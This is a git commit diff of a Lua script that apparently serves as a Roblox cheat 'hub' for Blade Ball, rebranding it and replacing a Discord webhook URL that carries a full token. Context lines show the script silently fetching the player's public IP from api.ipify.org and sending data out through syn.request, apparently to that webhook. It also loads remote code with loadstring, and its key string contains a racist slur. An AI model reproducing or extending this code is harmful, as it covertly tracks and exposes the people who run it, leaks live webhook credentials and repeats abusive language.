c361fd9ce461833470dd92f33b2666d1c6e165c2
Imposterundetalelover <112672496+Imposterundetalelover@users.noreply.github.com>
2023-11-04 23:49:02 +0800

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,5 +1,5 @@
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1170047672200200242/2OPS75uIiajusrLr5xkNE10yiK1WsubGkaTQeupXhMxLkWoC0oSdWfHos7WAbBo4mT4O"
+local WebhookURL = "https://discord.com/api/webhooks/1165231029531983963/2qoVUmhuFfxWaBpq6Ef6B1LTSkugzeVf9MQ7J23Yv30YE8LlZN5bpbduGRNUP4fh7erG"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
@@ -44,28 +44,28 @@ syn.request(
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "Blade Ball || Fazed Hub",
-   LoadingTitle = "Fazed Hub",
-   LoadingSubtitle = "by xeno",
+   Name = "Blade Ball || bladeballer Hub",
+   LoadingTitle = "stop posting about among us Hub",
+   LoadingSubtitle = "by genl",
    ConfigurationSaving = {
       Enabled = false,
       FolderName = nil, -- Create a custom folder for your hub/game
-      FileName = "Fazed Hub"
+      FileName = "joeware"
    },
    Discord = {
       Enabled = false,
-      Invite = "QmgyFqRcp8", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
+      Invite = "JHnd2TGy", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
       RememberJoins = true -- Set this to false to make them join the discord every time they load it up
    },
    KeySystem = true, -- Set this to true to use our key system
    KeySettings = {
-      Title = "Fazed Key System",
+      Title = "Clownware Key System",
       Subtitle = nil,
-      Note = "To get the key, join our discord server, vanity: QmgyFqRcp8",
+      Note = "To get the key, join our discord server, vanity: JHnd2TGy",
       FileName = "Keys", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
-      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
       GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
-      Key = {"FAZEDBLADEBALL"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+      Key = {"Privatekeyhubidkjoestoplookinfdombshitihateyouiwilleatcrocsikliekormfdsfdsfsdfadsaddchingchongsingsong"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
    }
 })
 
@@ -91,7 +91,7 @@ localPlayer.CharacterAdded:Connect(onCharacterAdded)
 
 Rayfield:Notify({
    Title = "✅ Script Executed ✅",
-   Content = "Fazed Best Hub?",
+   Content = "clownware Best Hub?",
    Duration = 5,
    Image = nil,
    Actions = { -- Notification Buttons
